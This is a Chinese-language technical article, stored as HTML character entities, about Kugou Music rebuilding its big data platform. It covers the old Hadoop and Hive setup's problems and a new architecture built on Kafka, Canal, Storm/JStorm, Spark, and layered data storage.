&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;&#x5728;&#x8BB2;&#x91CD;&#x6784;&#x539F;&#x56E0;&#x524D;&#xFF0C;&#x5148;&#x4ECB;&#x7ECD;&#x4E0B;&#x539F;&#x6709;&#x7684;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x4ECE;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#xFF0C;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;Hadoop1.x+hive&#x505A;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(T+1)&#xFF0C;&#x57FA;&#x4E8E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x3001;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x51E0;&#x4E2A;&#x73AF;&#x8282;&#x5B58;&#x5728;&#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x6765;&#x5217;&#x4E3E;&#x4E0B;&#x3002; &#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;1&#x3001;&#x6570;&#x636E;&#x6536;&#x96C6;&#x63A5;&#x53E3;&#x4F17;&#x591A;&#xFF0C;&#x4E14;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x6DF7;&#x4E71;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x4E2A;&#x4E1A;&#x52A1;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E0A;&#x62A5;&#x63A5;&#x53E3;2&#x3001;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x7684;&#x91CD;&#x590D;&#x5F00;&#x53D1;&#x6210;&#x672C;3&#x3001;&#x4E0D;&#x80FD;&#x6C47;&#x603B;&#x4E0A;&#x62A5;&#xFF0C;&#x6D88;&#x8017;&#x5BA2;&#x6237;&#x7AEF;&#x8D44;&#x6E90;&#xFF0C;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;4&#x3001;&#x6BCF;&#x4E2A;&#x63A5;&#x53E3;&#x6536;&#x96C6;&#x6570;&#x636E;&#x9879;&#x548C;&#x683C;&#x5F0F;&#x4E0D;&#x7EDF;&#x4E00;&#xFF0C;&#x52A0;&#x5927;&#x540E;&#x671F;&#x6570;&#x636E;&#x7EDF;&#x8BA1;&#x5206;&#x6790;&#x96BE;&#x5EA6;5&#x3001;&#x5404;&#x4E2A;&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#x8D28;&#x91CF;&#x5E76;&#x4E0D;&#x9AD8;&#xFF0C;&#x5B58;&#x5728;&#x88AB;&#x5237;&#xFF0C;&#x6CC4;&#x5BC6;&#x7B49;&#x98CE;&#x9669; &#x6570;&#x636E;&#x63A5;&#x5165;:1&#x3001;&#x901A;&#x8FC7;rsync&#x540C;&#x6B65;&#x6587;&#x4EF6;&#xFF0C;&#x5F88;&#x96BE;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x6D41;&#x8BA1;&#x7B97;&#x7684;&#x9700;&#x6C42;2&#x3001;&#x63A5;&#x5165;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x540E;&#xFF0C;&#x5F88;&#x96BE;&#x6392;&#x67E5;&#x53CA;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF0C;&#x9700;&#x8981;&#x5F88;&#x9AD8;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x6392;&#x67E5;3&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x901A;&#x8FC7;Kettle&#x6BCF;&#x5929;&#x5168;&#x91CF;&#x540C;&#x6B65;&#x5230;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x540C;&#x6B65;&#x65F6;&#x95F4;&#x957F;&#xFF0C;&#x5BFC;&#x81F4;&#x4F9D;&#x8D56;&#x7684;&#x4F5C;&#x4E1A;&#x7ECF;&#x5E38;&#x4F1A;&#x6709;&#x5EF6;&#x65F6;&#x73B0;&#x8C61; &#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;1&#x3001;ETL&#x96C6;&#x4E2D;&#x5728;&#x4F5C;&#x4E1A;&#x8BA1;&#x7B97;&#x524D;&#x8FDB;&#x884C;&#x5904;&#x7406;2&#x3001;&#x5B58;&#x5728;&#x91CD;&#x590D;&#x6E05;&#x6D17; &#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;1&#x3001;&#x5927;&#x90E8;&#x5206;&#x4F5C;&#x4E1A;&#x901A;&#x8FC7;crontab&#x8C03;&#x5EA6;&#xFF0C;&#x4F5C;&#x4E1A;&#x591A;&#x4E86;&#x540E;&#x4E0D;&#x5229;&#x4E8E;&#x7BA1;&#x7406;2&#x3001;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x51B2;&#x7A81; &#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;1&#x3001;&#x53EA;&#x6709;&#x786C;&#x4EF6;&#x4E0E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x76D1;&#x63A7;2&#x3001;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x65B9;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x7B49;&#x4E8E;&#x7A7A;&#x767D; &#x57FA;&#x4E8E;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#xFF0C;&#x7ED3;&#x5408;&#x5728;&#x5927;&#x6570;&#x636E;&#x4E2D;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x8D8A;&#x9AD8;&#xFF0C;&#x6570;&#x636E;&#x8D8A;&#x6709;&#x4EF7;&#x503C;(&#x5982;&#xFF1A;&#x5B9E;&#x65F6;&#x4E2A;&#x6027;&#x5316;&#x63A8;&#x8350;&#x7CFB;&#x7EDF;&#xFF0C;RTB&#x7CFB;&#x7EDF;&#xFF0C;&#x5B9E;&#x65F6;&#x9884;&#x8B66;&#x7CFB;&#x7EDF;&#x7B49;)&#x7684;&#x7406;&#x5FF5;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5F00;&#x59CB;&#x5927;&#x91CD;&#x6784;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#x3002; &#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5728;&#x8BB2;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x524D;&#xFF0C;&#x5148;&#x8BB2;&#x4E0B;&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;&#x4E0E;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002; 1.&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;&#xFF1A;&#x201C;&#x5927;&#x91CF;&#x5316;(Volume)&#x3001;&#x591A;&#x6837;&#x5316;(Variety)&#x3001;&#x5FEB;&#x901F;&#x5316;(Velocity)&#x3001;&#x4EF7;&#x503C;&#x5BC6;&#x5EA6;&#x4F4E;(Value)&#x201D;&#x5C31;&#x662F;&#x201C;&#x5927;&#x6570;&#x636E;&#x201D;&#x663E;&#x8457;&#x7684;4V&#x7279;&#x5F81;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#xFF0C;&#x53EA;&#x6709;&#x5177;&#x5907;&#x8FD9;&#x4E9B;&#x7279;&#x70B9;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x624D;&#x662F;&#x5927;&#x6570;&#x636E;&#x3002; 2.&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF1A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;&#x5728;&#x6210;&#x672C;&#x53EF;&#x627F;&#x53D7;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x975E;&#x5E38;&#x5FEB;&#x901F;(velocity)&#x5730;&#x91C7;&#x96C6;&#x3001;&#x53D1;&#x73B0;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x4ECE;&#x5927;&#x91CF;(volumes)&#x3001;&#x591A;&#x7C7B;&#x522B;(variety)&#x7684;&#x6570;&#x636E;&#x4E2D;&#x63D0;&#x53D6;&#x4EF7;&#x503C;(value)&#xFF0C;&#x5C06;&#x662F;IT&#x9886;&#x57DF;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x6280;&#x672F;&#x4E0E;&#x67B6;&#x6784;&#x3002; &#x4ECB;&#x7ECD;&#x4E86;&#x5927;&#x6570;&#x636E;&#x7684;&#x7279;&#x6027;&#x53CA;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;&#x770B;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#xFF1A; &#x4ECE;&#x8FD9;&#x5F20;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x5230;&#x5927;&#x6570;&#x636E;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x670D;&#x52A1;&#x3001;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x6709;&#x5177;&#x6709;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x7B49;&#x7279;&#x6027;&#xFF0C;&#x90FD;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x66F4;&#x597D;&#x7684;&#x670D;&#x52A1;&#x6253;&#x4E0B;&#x57FA;&#x7840;&#x3002;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#x8FC7;&#x7A0B;&#x90FD;&#x88AB;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x6570;&#x636E;&#x5F02;&#x5E38;&#x81EA;&#x52A8;&#x9884;&#x8B66;&#x3001;&#x544A;&#x8B66;&#x3002;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5982;&#x56FE;&#xFF1A; &#x5C06;&#x5927;&#x6570;&#x636E;&#x8BA1;&#x7B97;&#x5206;&#x4E3A;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x5728;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x5954;&#x7740;&#x80FD;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7684;&#xFF0C;&#x4E00;&#x5B9A;&#x8D70;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x5904;&#x7406;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x6765;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x53CA;&#x6570;&#x636E;&#x4EF7;&#x503C;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x8F7B;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x4F7F;&#x7528;&#x7387;&#x96C6;&#x4E2D;&#x73B0;&#x8C61;&#x3002; &#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x6E90;&#x91C7;&#x96C6;&#x670D;&#x52A1;&#xFF0C;&#x4ECE;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x6E90;&#x5206;&#x4E3A;&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;&#x4E0B;&#x9762;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x662F;&#x600E;&#x4E48;&#x91C7;&#x96C6;&#x63A5;&#x5165;&#x7684;&#x3002; a.&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;&#xFF1A; &#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x8981;&#x6C42;&#x5B9E;&#x65F6;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#xFF0C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x7B49;&#x7279;&#x6027;&#x3002;&#x6280;&#x672F;&#x9009;&#x578B;&#x65F6;&#xFF0C;&#x5BF9;&#x5F00;&#x6E90;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x5DE5;&#x5177;flume,scribe,chukwa&#x6D4B;&#x8BD5;&#x5BF9;&#x6BD4;&#xFF0C;&#x53D1;&#x73B0;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x9700;&#x6C42;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x9009;&#x62E9;&#x57FA;&#x4E8E;kafka&#x5F00;&#x53D1;&#x4E00;&#x5957;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#xFF0C;&#x6765;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x9700;&#x6C42;&#x3002;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x7684;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x8D70;&#x4E86;&#x4E00;&#x4E9B;&#x5F2F;&#x8DEF;&#xFF0C;&#x6700;&#x540E;&#x91C7;&#x7528;nginx+lua&#x5F00;&#x53D1;&#xFF0C;&#x57FA;&#x4E8E;lua&#x5B9E;&#x73B0;&#x4E86;kafka&#x751F;&#x4EA7;&#x8005;&#x534F;&#x8BAE;&#x3002;&#x6709;&#x5174;&#x8DA3;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x53BB;Github&#x4E0A;&#x770B;&#x770B;&#xFF0C;&#x53E6;&#x4E00;&#x540C;&#x4E8B;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x5728;github&#x4E0A;&#x6BD4;&#x8F83;&#x6D3B;&#x8DC3;&#xFF0C;&#x88AB;&#x4E00;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x5E94;&#x7528;&#x4E8E;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x4E86;&#x3002; b.&#x540E;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;&#xFF1A; FileCollect,&#x8003;&#x8651;&#x5230;&#x5F88;&#x591A;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E0D;&#x80FD;&#x6539;&#x52A8;&#xFF0C;&#x4E3A;&#x51CF;&#x5C11;&#x4FB5;&#x5165;&#x5F0F;&#xFF0C;&#x76EE;&#x524D;&#x662F;&#x91C7;&#x7528;Go&#x8BED;&#x8A00;&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x91C7;&#x96C6;&#xFF0C;&#x5E74;&#x540E;&#x4E5F;&#x51C6;&#x5907;&#x91CD;&#x6784;&#x8FD9;&#x5757;&#x3002; &#x524D;&#x7AEF;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x6574;&#x4F53;&#x67B6;&#x6784;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; c.&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x63A5;&#x5165; &#x5229;&#x7528;Canal&#x901A;&#x8FC7;MySQL&#x7684;binlog&#x673A;&#x5236;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x4E1A;&#x52A1;&#x589E;&#x91CF;&#x6570;&#x636E;&#x3002; &#x6570;&#x636E;&#x7EDF;&#x4E00;&#x63A5;&#x5165;&#xFF1A;&#x4E3A;&#x4E86;&#x540E;&#x9762;&#x6570;&#x636E;&#x6D41;&#x73AF;&#x8282;&#x7684;&#x5904;&#x7406;&#x89C4;&#x8303;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x63A5;&#x5165;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x5FC5;&#x987B;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x8F6C;&#x6362;&#x7EDF;&#x4E00;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#x96C6;&#x7FA4;&#xFF0C;&#x907F;&#x514D;&#x540E;&#x7AEF;&#x591A;&#x79CD;&#x63A5;&#x5165;&#x65B9;&#x5F0F;&#x7684;&#x5904;&#x7406;&#x95EE;&#x9898;&#x3002; &#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;(ETL)&#xFF1A;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x538B;&#x529B;&#x53CA;&#x6570;&#x636E;&#x53EF;&#x91CD;&#x7528;&#x6027;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x89E3;&#x538B;&#x3001;&#x89E3;&#x5BC6;&#x3001;&#x8F6C;&#x4E49;&#xFF0C;&#x90E8;&#x5206;&#x7B80;&#x5355;&#x7684;&#x8865;&#x5168;&#xFF0C;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5904;&#x7406;&#x7B49;&#x5DE5;&#x4F5C;&#x524D;&#x79FB;&#x5230;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x5904;&#x7406;&#xFF0C;&#x4E3A;&#x540E;&#x9762;&#x73AF;&#x8282;&#x7684;&#x6570;&#x636E;&#x91CD;&#x7528;&#x6253;&#x4E0B;&#x624E;&#x5B9E;&#x7684;&#x57FA;&#x7840;(&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;)&#x3002; &#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#xFF1A;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x5927;&#x91CF;&#x6570;&#x636E;&#x6D41;(400+&#x4EBF;&#x6761;/&#x5929;)&#x5199;&#x5165;HDFS&#xFF0C;&#x5BFC;&#x81F4;HDFS&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x7A33;&#x5B9A;&#x73B0;&#x8C61;&#x53CA;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6027;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x540E;&#x7684;&#x6570;&#x636E;&#x91CD;&#x65B0;&#x5199;&#x5165;Kafka&#x5E76;&#x4FDD;&#x7559;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#x901A;&#x8FC7;KG-Camus&#x62C9;&#x5230;HDFS(&#x901A;&#x8FC7;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x76F8;&#x5E94;&#x7684;&#x4F5C;&#x4E1A;&#x8BA1;&#x5212;)&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x57FA;&#x4E8E;Storm/JStorm&#x76F4;&#x63A5;&#x4ECE;Kafka&#x6D88;&#x8D39;&#xFF0C;&#x6709;&#x5F88;&#x5B8C;&#x7F8E;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;storm-kafka&#x7EC4;&#x4EF6;&#x3002; &#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(&#x6279;&#x5904;&#x7406;)&#xFF1A;&#x901A;&#x8FC7;spark&#xFF0C;spark SQL&#x5B9E;&#x73B0;&#xFF0C;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x6BD4;hive&#x63D0;&#x9AD8;5&#x2014;10&#x500D;&#xFF0C;hive&#x811A;&#x672C;&#x90FD;&#x5728;&#x8F6C;&#x6362;&#x4E3A;Spark/Spark SQL;&#x90E8;&#x5206;&#x590D;&#x6742;&#x7684;&#x4F5C;&#x4E1A;&#x8FD8;&#x662F;&#x901A;&#x8FC7;Hive/Spark&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x516C;&#x53F8;&#x90FD;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x4E5F;&#x6709;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x53EA;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x505A;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x8BBE;&#x8BA1;&#x65F6;&#x5F31;&#x5316;&#x4E86;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x6982;&#x5FF5;&#x3002;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5206;&#x5C42;&#x6A21;&#x578B;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x6A21;&#x578B;&#x5206;&#x4E3A;&#xFF1A;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;Data Cache Layer(DCL)&#x3001;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;Data Detail Layer(DDL)&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;Data Summary Layer(DSL)&#x3001;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;Data Application Layer(DAL)&#x3001;&#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#x3001;&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#x3002;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5C42;(DCL)&#xFF1A;&#x5B58;&#x50A8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4E0A;&#x62A5;&#x7684;&#xFF0C;&#x7ECF;&#x8FC7;&#x89E3;&#x7801;&#x3001;&#x6E05;&#x6D17;&#x3001;&#x8F6C;&#x6362;&#x540E;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#xFF0C;&#x4E3A;&#x6570;&#x636E;&#x8FC7;&#x6EE4;&#x505A;&#x51C6;&#x5907;&#x3002; &#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;(DDL)&#xFF1A;&#x5B58;&#x50A8;&#x63A5;&#x53E3;&#x7F13;&#x51B2;&#x5C42;&#x6570;&#x636E;&#x7ECF;&#x8FC7;&#x8FC7;&#x6EE4;&#x540E;&#x7684;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x3002; &#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;(Common)&#xFF1A;&#x4E3B;&#x8981;&#x5B58;&#x50A8;&#x7EF4;&#x8868;&#x6570;&#x636E;&#x4E0E;&#x5916;&#x90E8;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002; &#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;(DSL)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x660E;&#x7EC6;&#x6570;&#x636E;&#xFF0C;&#x6309;&#x4E1A;&#x52A1;&#x4E3B;&#x9898;&#xFF0C;&#x4E0E;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x540E;&#x7684;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x4E3B;&#x9898;&#x6570;&#x636E;&#x3001;&#x7528;&#x6237;&#x884C;&#x4E3A;&#x5BBD;&#x8868;&#x6570;&#x636E;&#x3001;&#x8F7B;&#x91CF;&#x6C47;&#x603B;&#x6570;&#x636E;&#x7B49;&#x3002;&#x4E3A;&#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;&#x7EDF;&#x8BA1;&#x8BA1;&#x7B97;&#x63D0;&#x4F9B;&#x57FA;&#x7840;&#x6570;&#x636E;&#x3002;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x7684;&#x6570;&#x636E;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x3002; &#x6570;&#x636E;&#x5E94;&#x7528;&#x5C42;(DAL)&#xFF1A;&#x5B58;&#x50A8;&#x8FD0;&#x8425;&#x5206;&#x6790;(Operations Analysis )&#x3001;&#x6307;&#x6807;&#x4F53;&#x7CFB;(Metrics System)&#x3001;&#x7EBF;&#x4E0A;&#x670D;&#x52A1;(Online Service)&#x4E0E;&#x7528;&#x6237;&#x5206;&#x6790;(User Analysis)&#x7B49;&#x3002;&#x9700;&#x8981;&#x5BF9;&#x5916;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x8FD9;&#x4E00;&#x5C42;&#x3002;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x70ED;&#x6570;&#x636E;&#x90E8;&#x5206;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x9700;&#x8981;&#x5230;DSL&#x5C42;&#x88C5;&#x8F7D;&#x67E5;&#x8BE2;&#x3002; &#x6570;&#x636E;&#x5206;&#x6790;&#x5C42;(Analysis)&#xFF1A;&#x5B58;&#x50A8;&#x5BF9;&#x6570;&#x636E;&#x660E;&#x7EC6;&#x5C42;&#x3001;&#x516C;&#x5171;&#x6570;&#x636E;&#x5C42;&#x3001;&#x6570;&#x636E;&#x6C47;&#x603B;&#x5C42;&#x5173;&#x8054;&#x540E;&#x7ECF;&#x8FC7;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x7684;&#x3001;&#x4E3A;&#x63A8;&#x8350;&#x3001;&#x5E7F;&#x544A;&#x3001;&#x699C;&#x5355;&#x7B49;&#x6570;&#x636E;&#x6316;&#x6398;&#x9700;&#x6C42;&#x63D0;&#x4F9B;&#x4E2D;&#x95F4;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x636E;&#x3002; 